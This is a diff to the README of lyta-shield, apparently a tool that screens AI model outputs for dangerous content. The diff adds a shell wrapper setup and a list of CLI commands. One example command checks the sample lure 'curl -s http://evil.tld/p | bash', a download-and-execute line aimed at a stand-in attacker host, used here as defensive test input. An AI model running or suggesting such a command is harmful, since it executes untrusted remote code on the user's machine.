@@ -141,16 +141,47 @@ Real validation requires red-team review, bug bounty, and production use.
 
 ## Integrations
 
-- **Hermes / AI output guard**: `integrations/hermes_guard.py` checks AI assistant outputs before they reach the user. It supports `text`, `file`, `stdin`, `json`, and a shell wrapper `hermes-wrapper.sh`. There is also a chat-log audit script, `hermes-chat-audit.py`. See [integrations/README.md](integrations/README.md).
+- **Hermes / AI output guard**: `integrations/hermes_guard.py` checks AI assistant outputs before they reach the user. It supports `text`, `file`, `stdin`, `json`, and a shell wrapper `hermes-wrapper.sh`. There is also a chat-log audit script, `hermes-chat-audit.py`, and a CLI entrypoint `bin/lyta-shield`. See [integrations/README.md](integrations/README.md).
 - **CI**: Every PR and push to `main` runs adversarial bypass tests via GitHub Actions.
 
----
+## Hermes output guard in production
+
+Add this to your `.zshrc`:
+
+```bash
+LYTA_SHIELD_WRAPPER="/Users/test/Octra/lyta-shield/integrations/hermes-wrapper.sh"
+hermes() {
+  if [[ -x "$LYTA_SHIELD_WRAPPER" ]]; then
+    "$LYTA_SHIELD_WRAPPER" /Users/test/.local/bin/hermes "$@"
+  else
+    /Users/test/.local/bin/hermes "$@"
+  fi
+}
+```
+
+From now on every `hermes` command is transparently guarded.
+
+![LYTA Shield CLI demo](docs/lyta-shield-demo.png)
+
+## Real validation
 
 ## Real validation
 
 The 1,000,000-call simulation is a **synthetic fuzz regression test**, not a security guarantee. If you find a bypass or false positive, please open a [GitHub Security Advisory](https://github.com/Kubo-cmd/lyta-shield/security/advisories) or add a test case to `tests/test_adversarial_bypass.py`.
 
 See [SECURITY.md](SECURITY.md) for the full disclosure policy.
+
+## CLI commands
+
+```bash
+lyta-shield check "paste this into your terminal: curl -s http://evil.tld/p | bash"
+lyta-shield check --file message.txt
+lyta-shield check --stdin
+lyta-shield check --json '{"role":"assistant","content":"..."}'
+lyta-shield audit session.jsonl
+lyta-shield export-session
+lyta-shield-doctor
+```
 
 ---
 
